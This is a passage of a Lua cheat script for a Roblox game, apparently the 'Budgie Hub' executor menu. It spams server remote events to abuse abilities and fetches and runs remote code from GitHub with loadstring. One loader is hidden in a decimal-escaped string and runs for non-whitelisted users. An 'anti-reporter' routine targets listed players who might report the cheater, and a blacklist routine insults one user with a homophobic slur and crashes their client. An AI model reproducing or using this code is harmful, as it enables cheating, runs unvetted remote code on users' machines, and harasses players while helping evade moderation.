        for i = 1, 40 do
        game:GetService("ReplicatedStorage").GojoSatoru.rush:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Gojo v3 Purple",
 Callback = function()
        game:GetService("ReplicatedStorage").GojoV3.haitram:FireServer()
   end    
})

Tab:AddButton({
 Name = "Gojo v3 Nuke",
 Callback = function()
        game:GetService("ReplicatedStorage").GojoV3.nuke:FireServer()
   end    
})

Tab:AddButton({
 Name = "Test Sukuna Slash",
 Callback = function()
        game:GetService("ReplicatedStorage").sukunaslash:FireServer()
   end    
})

Tab:AddButton({
 Name = "Beta Replication",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/BetaReplication/main/AnM"))()
   end    
})

local Section = Tab:AddSection({
 Name = "Other custom dev tools"
})

Tab:AddButton({
 Name = "Ultimate Tool",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/TestTool_AnM1/main/Ultimate%20Tool"))()
   end    
})

Tab:AddButton({
 Name = "A-Train Tool",
 Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "A-Train Tool"
tool.RequiresHandle = false

local lastPressTime = 0
tool.Activated:Connect(function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 5.5 then
                lastPressTime = currentTime 
                for i = 1, 100 do
        game:GetService("ReplicatedStorage").GojoSatoru.rush:FireServer()
        end
 wait(1.5)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
      wait(1.5)
   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 300
            end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
   end    
})

Tab:AddButton({
 Name = "Breath of Death",
 Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "Breath of Death"
tool.RequiresHandle = false

local lastPressTime = 0
tool.Activated:Connect(function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 5 then
                lastPressTime = currentTime 
                local character = game.Players.LocalPlayer.Character
local backpack = game.Players.LocalPlayer.Backpack
if not backpack:FindFirstChild("Mini Uzumaki") then
local args = { "Kenjaku" }
           game:GetService("ReplicatedStorage").Picked:FireServer(unpack(args))
        wait(0.5)
  if not backpack:FindFirstChild("Mini Uzumaki") then
    repeat wait(0.25) 
local args = { "Kenjaku" }
           game:GetService("ReplicatedStorage").Picked:FireServer(unpack(args))
until backpack["Mini Uzumaki"]
end
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://17177791422"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(0.5)
for i = 1, 6 do
  wait(0.5)
 local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hu = char.Humanoid
local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
local playerForward = humanoidRootPart.CFrame.LookVector
local startPos = humanoidRootPart.CFrame * CFrame.new(5 * playerForward)

local numUzumaki = 25
local spacing = 40

for i = 1, numUzumaki do
    local args = {
        [1] = startPos + ((i - 1) * spacing * playerForward),
        [2] = math.huge
    }
    game.Players.LocalPlayer.Backpack["Mini Uzumaki"].FireServer.RemoteEvent:FireServer(unpack(args))
end
end
 wait(1.5)
 k:Stop()
 else
 local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://17177791422"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(0.5)
for i = 1, 3 do
  wait(1)
 local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hu = char.Humanoid
local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
local playerForward = humanoidRootPart.CFrame.LookVector
local startPos = humanoidRootPart.CFrame * CFrame.new(5 * playerForward)

local numUzumaki = 25
local spacing = 40

for i = 1, numUzumaki do
    local args = {
        [1] = startPos + ((i - 1) * spacing * playerForward),
        [2] = math.huge
    }
    game.Players.LocalPlayer.Backpack["Mini Uzumaki"].FireServer.RemoteEvent:FireServer(unpack(args))
end
end
 wait(1.5)
 k:Stop()
 end
            end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
   end    
})

Tab:AddButton({
 Name = "Hollow Punch",
 Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "Hollow Punch"
tool.RequiresHandle = false

local lastPressTime = 0
tool.Activated:Connect(function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 10 then
                lastPressTime = currentTime 
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                local StarterGui = game:GetService("StarterGui")
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
                local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://16449579122"
Anim.Name = "Testor"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(1)
Spooky = Instance.new("Sound", game.Players.LocalPlayer.Character.Torso)
Spooky.Name = "Hollow Punch"
Spooky.SoundId = "rbxassetid://14737679866"
Spooky.Volume = 3
Spooky.PlaybackSpeed = 1
Spooky.Looped = false
Spooky:Play()
 wait(8.6)
for i = 0, 3 do
coroutine.wrap(function()
   local ohTable1 = {
                ["Function"] = "Fire",
                ["Name"] = "OmniDirectionalPunch",
                ["rootpos"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-100 * i)
            }

            game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
            game:GetService("RunService").Heartbeat:Wait()
local animations = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
for i, animation in ipairs(animations) do
    if animation.Animation.Name ~= "Testor" then
        animation:Stop()
    end
end
            end)()
    end
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    local StarterGui = game:GetService("StarterGui")
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
            end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
   end    
})

Tab:AddButton({
 Name = "Supernatural Sword",
 Callback = function()
        local assetId = tonumber(7091439307)
 if not assetId then
   warn("Invalid asset ID")
   return
  end
local user = game.Players.LocalPlayer
 
  local model = game:GetObjects("rbxassetid://" .. assetId)[1]
  local handle = model:FindFirstChild("Handle")
model.Parent = user.Backpack
model.Name = "Supernatural Sword"
model.ToolTip = "Holy shit, what a fucking sword!"

local lastPressTime = 0
model.Activated:Connect(function()
local currentTime = tick()
            if currentTime - lastPressTime >= 5 then
                lastPressTime = currentTime
   local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://18225562386"
Anim.Name = "Testor"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(0.3)
for i = 0, 3 do
coroutine.wrap(function()
   local ohTable1 = {
                ["Function"] = "Fire",
                ["Name"] = "OmniDirectionalPunch",
                ["rootpos"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-100 * i)
            }

            game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
            game:GetService("RunService").Heartbeat:Wait()
local animations = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
for i, animation in ipairs(animations) do
    if animation.Animation.Name ~= "Testor" then
        animation:Stop()
    end
end
            end)()
    end
wait(1.5)
k:AdjustSpeed(2)
  wait(0.4)
k:AdjustSpeed(0.3)
 end
end)
   end    
})

Tab:AddButton({
 Name = "Celestial Staff",
 Callback = function()
        local assetId = tonumber(5543463619)
 if not assetId then
   warn("Invalid asset ID")
   return
  end
local user = game.Players.LocalPlayer
 
  local model = game:GetObjects("rbxassetid://" .. assetId)[1]
  local handle = model:FindFirstChild("Handle")
model.Parent = user.Backpack
model.Name = "Celestial Staff"
model.ToolTip = ""

local lastPressTime = 0
model.Activated:Connect(function()
local currentTime = tick()
            if currentTime - lastPressTime >= 8 then
                lastPressTime = currentTime
   local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://15567980864"
Anim.Name = "Testor"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(0.75)
  wait(3)
for i = 1, 70 do
coroutine.wrap(function()
game:GetService("ReplicatedStorage").Remotes.colovo:FireServer()
            game:GetService("RunService").Heartbeat:Wait()
local animations = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
for i, animation in ipairs(animations) do
    if animation.Animation.Name ~= "Testor" then
        animation:Stop(0)
    end
end
            end)()
    end
   end
end)
   end    
})

local Tab = Window:MakeTab({
	Name = "Instruction",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

ds = [[

1. For the functions in the "Character" tab to work, you need to select this character or at least have this tool

2. The menu can be moved, but if it doesn't move then it's a problem with your executor

3. I'm not a god and I can't get absolutely any ability so don't ask me to get any admin abilities or something like that

4. you can use commands in chat /e cmds (if you execute the script again this will be used several times)

5. If an anti reporter detects a player, then I wish to either kick him or leave the game, because because of them you can get banned

6. bugmode allows the local player not to die from normal damage and tools can be used, and godmode with dodge bypasses absolutely any damage, but items cannot be used (for example, when using Mugetsu with bugmode the player dies, but with this mod the player will not die)

7. I advise you not to use Input Character, but Never turn off SelectionGui, because the window does not disappear when selecting a character and it’s more convenient this way (this function is located in the "Options" tab)

8. SSC is mean "Server Side Cooldown"(find in tab "Dev Abilities")
]]

Tab:AddParagraph("Instruction: ", ds)

OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Creator – MEGACOCONUT (ADSKerX) and Hamsterovich (Wolfdmitrich)",
 Image = "rbxassetid://4483345998",
 Time = 10
})

local Tab = Window:MakeTab({
	Name = "Creators",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("ADSKerX","The main creator of this script. did a lot of different functions and scripts")
Tab:AddParagraph("Wolfdmitrich","Web scripter who knows: Python, Html, CSS and a little Lua. He did a lot for this script, for example: made an obfuscator for the script, helped me make admin commands, abilities for characters, and so on")

local function chatadm()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/ChatAdmin_AnM/main/Source"))()
end

local function DS()
  if game.Players.LocalPlayer.UserId ~= 5042713445 and game.Players.LocalPlayer.UserId ~= 5199937747 and game.Players.LocalPlayer.UserId ~= 6036506267 and game.Players.LocalPlayer.UserId ~= 5836619511 and game.Players.LocalPlayer.UserId ~= 1829451729 and game.Players.LocalPlayer.UserId ~= 4636825706 then
   loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\68\101\102\101\110\115\101\79\102\102\47\109\97\105\110\47\83\117\107\117\110\97\34\41\41\40\41\10")()
  end
end

local function antivoidbring()
local aspart = Instance.new("Part")
aspart.Name = "AntiFallPart2"
aspart.Size = Vector3.new(50000, 5, 50000)
aspart.Transparency = 0.8
aspart.Anchored = true
aspart.Position = Vector3.new(-246, -210, 2850)
aspart.Parent = game.Workspace
end

local function antireporters()
 local function hh()
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()
local playerIds = {
    2788546528,
    1464528932,
    587373633,
    1436511633,
    5056217394,
    3170498762,
    2760968590,
    2313552554,
    1562795410,
    7089504636,
    3561138863,
    2650923632,
    4682891511,
    2694288368,
    2247053017,
    2398148071,
    2907412267,
    5703791307,
    3990223741,
}

local function checkPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        if table.find(playerIds, player.UserId) then
            Spooky = Instance.new("Sound", game.Workspace)
            Spooky.Name = "Anti Reporter System"
            Spooky.SoundId = "rbxassetid://5304042701"
            Spooky.Volume = 1
            Spooky.PlaybackSpeed = 1
            Spooky.Looped = false
            Spooky:Play()
            OrionLib:MakeNotification({
                Name = "Budgie Hub | Detector",
                Content = "Attention! Reporter " .. player.Name .. " Joined in game what do you want to do with it?",
                Image = "rbxassetid://4483345998",
                Time = 10
            })
            wait(4)
            local h = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Top = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local Text1Button = Instance.new("TextButton")
local Text2Button = Instance.new("TextButton")
local Text3Button = Instance.new("TextButton")
local Text4Button = Instance.new("TextButton")

h.Name = "h"
h.Parent = game:GetService("CoreGui")
h.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = h
Main.Active = true
Main.Draggable = true
Main.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.3, 0, 0.3, 0)
Main.Size = UDim2.new(0, 300, 0, 160)
Main.Image = "rbxassetid://16336200609"

Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(0, 90, 0)
Top.BorderSizePixel = 0
Top.Size = UDim2.new(1, 0, 0, 30)

Title.Name = "Title"
Title.Parent = Top
Title.BackgroundColor3 = Color3.fromRGB(0, 60, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0, 0, 0.295454562, 0)
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Font = Enum.Font.SourceSans
Title.Text = "What do you want to do with it?"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(0, 99, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.1, 0, 0.35, 0)
TextButton.Size = UDim2.new(0.18, 0, 0.22, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "No quarter to be given"
TextButton.TextColor3 = Color3.fromRGB(0, 255, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

Text1Button.Parent = Main
Text1Button.BackgroundColor3 = Color3.fromRGB(0, 99, 0)
Text1Button.BorderSizePixel = 0
Text1Button.Position = UDim2.new(0.425, 0, 0.35, 0)
Text1Button.Size = UDim2.new(0.18, 0, 0.22, 0)
Text1Button.Font = Enum.Font.SourceSans
Text1Button.Text = "Get Out"
Text1Button.TextColor3 = Color3.fromRGB(0, 255, 0)
Text1Button.TextScaled = true
Text1Button.TextSize = 14.000
Text1Button.TextWrapped = true

Text2Button.Parent = Main
Text2Button.BackgroundColor3 = Color3.fromRGB(0, 99, 0)
Text2Button.BorderSizePixel = 0
Text2Button.Position = UDim2.new(0.75, 0, 0.35, 0)
Text2Button.Size = UDim2.new(0.18, 0, 0.22, 0)
Text2Button.Font = Enum.Font.SourceSans
Text2Button.Text = "Dont care"
Text2Button.TextColor3 = Color3.fromRGB(0, 255, 0)
Text2Button.TextScaled = true
Text2Button.TextSize = 14.000
Text2Button.TextWrapped = true

TextButton.MouseButton1Click:Connect(function()
if player.Character then
local gh = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
       wait(0.1)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-246, -189, 2850)
      wait(0.25)
local ohInstance1 = workspace[player.Name]["Torso"]
game:GetService("ReplicatedStorage").Remote.BoogieWoogie:FireServer(ohInstance1)
  task.wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gh
   h:Destroy()
  end
end)

Text1Button.MouseButton1Click:Connect(function()
   game:Shutdown()
end)

Text2Button.MouseButton1Click:Connect(function()
   h:Destroy()
end)
            return
        end
    end

    task.wait(1)
    checkPlayers()
end

checkPlayers()
 end
coroutine.wrap(hh)()
game.Players.PlayerAdded:Connect(hh)
end

local function blacklist()
  wait(1)
if game.Players.LocalPlayer.CharacterAppearanceId == 690624548 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 OrionLib:MakeNotification({
	Name = "Message to the Faggot",
	Content = "How could you betray me I don’t make scripts for people like you\nWell, you could rat me out, but I don’t want that, and therefore I will forbid you to use the script",
	Image = "rbxassetid://4483345998",
	Time = 15
 })
wait(15)
 OrionLib:MakeNotification({
	Name = "Die",
	Content = "But there will also be punishment",
	Image = "rbxassetid://4483345998",
	Time = 5
})
 wait(5)
OrionLib:MakeNotification({
	Name = "DIE",
	Content = "<p><font size='30'>BEHOLD THE POWER OF RECURTION!!</font></p>",
	Image = "rbxassetid://4483345998",
	Time = 1e9
})
  wait(2)
  local function die()
   local mes = Instance.new("Message", workspace)
   mes.Text = "Die"
   die()
  end
  
  die()
end
 end
 
 coroutine.wrap(blacklist)()

coroutine.wrap(antivoidbring)()
coroutine.wrap(antireporters)()
coroutine.wrap(DS)()
coroutine.wrap(chatadm)()
